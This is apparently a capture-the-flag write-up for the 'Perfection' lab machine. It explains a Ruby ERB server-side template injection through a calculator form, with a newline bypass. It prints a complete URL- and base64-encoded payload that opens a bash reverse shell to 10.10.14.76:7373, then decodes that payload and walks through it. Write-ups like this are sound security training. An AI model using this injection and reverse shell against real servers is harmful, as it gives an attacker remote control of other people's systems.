We know that Perfection webserver uses Ruby 3.0.2. So the webpage must be based on ruby.

The only way we have to introduce a payload into the webserver is through the interactive calculator. So let's play with it obbeying its requirements described at the bottom.

Using burpsuite and analyzing the request. We can observe that we can introduce a payload into the webserver. Nonetheless, we must know that we cannot
use the same payload technique we used in Headless because Perfection is based on Ruby.

We know that the develper used a Ruby server template. So we search on Google: server-side template injection ruby

We access the following URL and read the documentation. They have a specific case for ERB basic injection: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby:~:text=ERB%3A-,%3C%25%3D%207%20*%207%20%25%3E,-Slim%3A
They show the case `<%= 7 * 7 %>`.
Nonetheless our goal is to inject a reverse shell into the Ruby webserver, not multiplying. So in Ruby terminology would be something of style:
`<%= system("echo + payload");=>'.
Also, we must know that the Ruby server only interpretates commands URL encoded. So both the payload and the command injection myst be URL encoded.
Reading this documentation (in Spanish) https://www.uv.es/jac/guia/hexawin.htm
The command injection must be as follows:
`<%25%3dsystem("echo+URLencoded(payload);%25>`.
Using our previously encoded payload (first into base64 and later into URL encode) the final command injection is as follows:

category1=test1%0A<%25%3dsystem("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC43Ni83MzczIDA%2BJjE%3D|+base64+-d+|+bash");%25>1

Why %0A at the beginning of the payload? For Ruby to interpretate test1 and then independently the payload as a newline.
The part `|+base64+-d+|+bash`in the injection payload is used to decode a base64-encoded string and then execute it as a shell command.
1. First ruby decodes the string in URL format
2. Then the first pipe `|` orders to decode the base64-encoded string
3. The result is then sent to a second pipe `|` that takes the decoded output and passes it as input to the `bash` command.
4. `bash` executes the input as a shell script

The base64 string decodes into:

bash -i >& /dev/tcp/10.10.14.76/7373 0>&1

`bash -i` starts an interactive bash shell
`>& /dev/tcp/10.10.14.76/7373 0>&1`: Redirects the input and output of the bash shell (target) to a TCP connection to 10.10.14.76 on port 7373 (to our netcat listerner).

This effectively sets up a reverse shell, where the compromised server connects back to the attacker's machine, giving the attacker remote control over the server.
